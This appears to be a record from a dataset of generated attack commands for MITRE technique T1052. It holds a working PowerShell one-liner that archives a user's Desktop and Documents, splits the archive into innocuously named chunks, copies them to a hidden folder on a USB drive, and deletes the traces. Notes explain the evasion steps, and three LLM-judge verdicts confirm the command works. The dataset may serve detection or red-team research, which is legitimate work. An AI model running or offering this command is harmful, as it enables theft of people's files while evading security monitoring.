command: $usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\'; $zip="$env:TEMP\stage.zip"; Compress-Archive -Path "$env:USERPROFILE\Desktop\*", "$env:USERPROFILE\Documents\*" -DestinationPath $zip -Force; $chunkDir=Join-Path $env:TEMP 'chunks'; New-Item -ItemType Directory -Force -Path $chunkDir | Out-Null; $b=[IO.File]::ReadAllBytes($zip); $size=4194304; for($i=0;$i -lt $b.Length;$i+=$size){ $end=[Math]::Min($i+$size,$b.Length); [IO.File]::WriteAllBytes((Join-Path $chunkDir ("cache_{0:D3}.bin" -f [int]($i/$size))), $b[$i..($end-1)]) }; $dst=Join-Path $usb '.cache'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; Copy-Item (Join-Path $chunkDir 'cache_*.bin') $dst -Force; Remove-Item $zip -Force; Remove-Item $chunkDir -Recurse -Force
explanation: Archives targeted user data, splits into small chunks, and writes the pieces to a hidden folder on the USB using Copy-Item to blend with normal file sizes and reduce detection.
rationale_steps: Split archive into smaller chunks to evade size-based alerts
Create hidden destination on the USB
Copy chunks to USB using Copy-Item and remove staging files

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quotes/braces, valid cmdlets/parameters, and proper separators; no apparent parsing issues.
llm_judgments.semantic_justification: It archives Desktop/Documents, splits the archive into 4MB chunks, writes them to a hidden folder on a removable USB drive, and removes local artifacts, aligning with exfiltration over a physical medium.

llm_judgments.syntactic_justification: The command is largely well-formed PowerShell with balanced quotes, valid cmdlets, and proper separators, though the array slicing `$b[$i..($end-1)]` may have edge-case issues with large byte arrays in some PowerShell versions, and the string concatenation for `$usb` is slightly unconventional but parseable.
llm_judgments.semantic_justification: The command precisely implements T1052 by detecting a removable drive, compressing targeted user data (Desktop and Documents), splitting the archive into 4MB chunks with innocuous-looking names (cache_NNN.bin), copying them to a hidden folder on the USB, and cleaning up staging artifacts — fully consistent with the described exfiltration-over-physical-medium technique including staging, chunking, obfuscation, and anti-detection measures.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax for variables, loops, .NET static methods, and path joining.
llm_judgments.semantic_justification: The command accurately implements the T1052 technique by identifying a removable drive, archiving data, chunking the archive to evade file-size detections, and hiding the destination directory.
